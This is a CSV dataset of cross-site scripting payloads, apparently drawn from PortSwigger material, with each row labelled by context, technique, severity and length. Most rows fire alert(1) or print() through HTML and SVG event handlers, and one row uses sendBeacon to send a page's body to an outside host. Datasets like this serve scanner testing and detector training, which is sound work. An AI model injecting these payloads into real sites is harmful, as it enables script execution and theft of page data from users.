payload,context,technique,severity,length,source
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style=""position:absolute;"" onanimationcancel=""print()""></xss>",attribute,event_handler,high,175,portswigger
"<style>@keyframes x{}</style><xss style=""animation-name:x"" onanimationend=""alert(1)""></xss>",attribute,event_handler,high,91,portswigger
"<style>@keyframes slidein {}</style><xss style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></xss>",attribute,event_handler,high,160,portswigger
"<style>@keyframes x{}</style><xss style=""animation-name:x"" onanimationstart=""alert(1)""></xss>",attribute,event_handler,high,93,portswigger
<xss id=x onbeforematch=alert(1) hidden=until-found>,event_handler,event_handler,medium,52,portswigger
<body onbeforeprint=console.log(1)>,event_handler,event_handler,medium,35,portswigger
"<body onbeforeunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>",dom_sink,obfuscation,medium,97,portswigger
<svg><animate onbegin=alert(1) attributeName=x dur=1s>,event_handler,event_handler,high,54,portswigger
"<audio oncanplay=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",event_handler,event_handler,medium,80,portswigger
"<video oncanplaythrough=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",event_handler,event_handler,medium,87,portswigger
<xss oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>,event_handler,event_handler,medium,93,portswigger
<input type=hidden oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto>,event_handler,event_handler,medium,93,portswigger
"<video controls><source src=validvideo.mp4 type=video/mp4><track default oncuechange=alert(1) src=""data:text/vtt,WEBVTT FILE

1
00:00:00.000 --> 00:00:05.000 
<b>XSS</b>
""></video>",event_handler,event_handler,medium,180,portswigger
<audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>,event_handler,event_handler,medium,93,portswigger
<svg><animate onend=alert(1) attributeName=x dur=1s>,event_handler,event_handler,medium,52,portswigger
"<audio controls autoplay onended=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",event_handler,event_handler,medium,96,portswigger
<audio src/onerror=alert(1)>,event_handler,event_handler,high,28,portswigger
<a id=x tabindex=1 onfocus=alert(1)></a>,event_handler,event_handler,high,40,portswigger
<xss onfocus=alert(1) autofocus tabindex=1>,event_handler,event_handler,high,43,portswigger
<a id=x tabindex=1 onfocusin=alert(1)></a>,event_handler,event_handler,medium,42,portswigger
"<body onhashchange=""print()"">",event_handler,event_handler,medium,29,portswigger
<body onload=alert(1)>,event_handler,event_handler,high,22,portswigger
"<audio onloadeddata=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",event_handler,event_handler,medium,83,portswigger
